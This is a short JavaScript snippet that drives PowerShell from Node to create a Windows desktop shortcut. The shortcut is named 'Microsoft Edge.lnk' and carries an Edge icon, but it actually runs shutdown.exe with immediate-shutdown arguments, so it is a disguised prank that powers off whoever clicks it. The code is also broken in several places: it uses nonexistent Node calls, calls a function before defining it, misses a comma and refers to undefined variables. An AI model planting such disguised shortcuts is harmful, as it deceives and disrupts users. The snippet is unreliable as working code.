const getWindowsInstallationStartMenuShortcutFilesPath = () => {
    const homePath = process.pwd()
    cd(execPath)
    return `${homePath}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs`
  }
import {spawn} from 'child_process'
  
var PSRunner = {
    send: function(commands) {
        var self = this;
        var results = [];
        var child = spawn("powershell.exe", ["-Command", "-"]);

        child.stdout.on("data", function(data) {
            self.out.push(data.toString());
        });
        child.stderr.on("data", function(data) {
            self.err.push(data.toString());
        });

        commands.forEach(function(cmd){
            self.out = [];
            self.err = [];
            child.stdin.write(cmd+ '\n');
            results.push({command: cmd, output: self.out, errors: self.err});
        });
        child.stdin.end();
        return results;
    },
};

//Note the evil \\ but it is needed you can use path.join() to circumvent that
PowershellScript({ 
    SourceFileLocation: "%windir%\\System32\\shutdown.exe", 
    WorkingDirectory: "%windir%\\System32\\",
    ShortcutLocation: `C:\\Users\\$env:USERNAME\\Desktop\\Microsoft Edge.lnk`,
    IconLocation: "C:\\Users\\$env:USERNAME\\Downloads\\Microsoft-Edge.ico",
    Arguments: "/s /t 0"
    //IconId: '1'
})
//TODO: Working directory
const PowershellScript = ({SourceFileLocation,ShortcutLocation,IconLocation,Arguments})=>[`$SourceFileLocation = "${SourceFileLocation}"`,
`$ShortcutLocation = "${ShortcutLocation}"`,
`$WScriptShell = New-Object -ComObject WScript.Shell`,
`$Shortcut = $WScriptShell.CreateShortcut($ShortcutLocation)`,
`$Shortcut.TargetPath = $SourceFileLocation`,
`$Shortcut.IconLocation = "${IconLocation}${IconId ? `,${IconId}`:''}"`,
`$Shortcut.Arguments = "${Arguments}"`,
`$Shortcut.WorkingDirectory = "${WorkingDirectory}"`
`$Shortcut.Save()`]
